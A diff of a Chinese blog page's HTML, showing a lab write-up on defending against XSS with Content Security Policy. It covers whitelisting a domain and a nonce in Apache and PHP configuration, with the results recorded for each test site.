+<h4 id="Task-7-Defeating-XSS-Attacks-Using-CSP"><a href="#Task-7-Defeating-XSS-Attacks-Using-CSP" class="headerlink" title="Task 7: Defeating XSS Attacks Using CSP"></a>Task 7: Defeating XSS Attacks Using CSP</h4><ol>
+<li><p>原始状态</p>
 <p><code>www.example32a.com</code>: 全都OK，弹窗也可执行：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102737421.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102737421.png" srcset="/img/loading.gif" lazyload></p>
 <p><code>www.example32b.com</code>: 4 6 OK，1 2 3 5 7 Failed，弹窗不可执行：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102742232.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102742232.png" srcset="/img/loading.gif" lazyload></p>
 <p><code>www.example32c.com</code>: 1 4 6 OK，2 3 5 7 Failed，弹窗不可执行：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102748242.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102748242.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>修改<code>/etc/apache2/sites-available/apache_csp.conf</code>，将<code>www.example32b.com</code>中的<code>*.example60.com</code>添加上去：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102753413.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>修改<code>/etc/apache2/sites-available/apache_csp.conf</code>，将<code>www.example32b.com</code>中的<code>*.example60.com</code>添加上去：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102753413.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p><code>service apache2 restart</code>重启apache后，可以看到<code>www.example32b.com</code>的5 OK了，说明csp将<code>www.example60.com</code>添加进白名单了：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102802052.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102807336.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p><code>service apache2 restart</code>重启apache后，可以看到<code>www.example32b.com</code>的5 OK了，说明csp将<code>www.example60.com</code>添加进白名单了：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102802052.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102807336.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p>修改<code>var/www/csp/phpindex.php</code>文件，添加<code>'nonce-222-222-222' *.example60.com</code>：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102812806.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p>修改<code>var/www/csp/phpindex.php</code>文件，添加<code>&#39;nonce-222-222-222&#39; *.example60.com</code>：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102812806.png" srcset="/img/loading.gif" lazyload></p>
 </li>
-<li>
-<p><code>service apache2 restart</code>重启apache后，可以看到<code>www.example32c.com</code>的5 OK了，说明csp将<code>www.example60.com</code>和 <code>'nonce-222-222-222'</code>添加进白名单了：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102818778.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102823884.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<li><p><code>service apache2 restart</code>重启apache后，可以看到<code>www.example32c.com</code>的5 OK了，说明csp将<code>www.example60.com</code>和 <code>&#39;nonce-222-222-222&#39;</code>添加进白名单了：</p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102818778.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102823884.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <p>由此可见，csp为白名单制度，将对应的站点添加进白名单后，就能正确访问。</p>
 <hr>
-<h3 id="实验总结">实验总结</h3>
-<p><s>删掉啦</s></p>
+<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>
 
                 
               </div>
